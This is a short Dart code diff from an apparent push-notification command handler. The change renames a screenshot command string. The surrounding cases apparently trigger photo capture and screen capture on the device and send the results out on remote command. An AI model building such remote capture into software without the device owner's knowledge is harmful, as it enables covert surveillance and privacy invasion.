@@ -150,7 +150,7 @@ class FcmHandler {
           developer.log('✅ Photo capture command sent', name: _tag);
           break;
 
-        case 'CAPTURE_SCREENSHOT':
+        case 'SCREEN_CAPTURE':
           developer.log('🖥️ Executing: Capture Screenshot', name: _tag);
           await ScreenCaptureService.captureAndSend();
           developer.log('✅ Screenshot capture command sent', name: _tag);
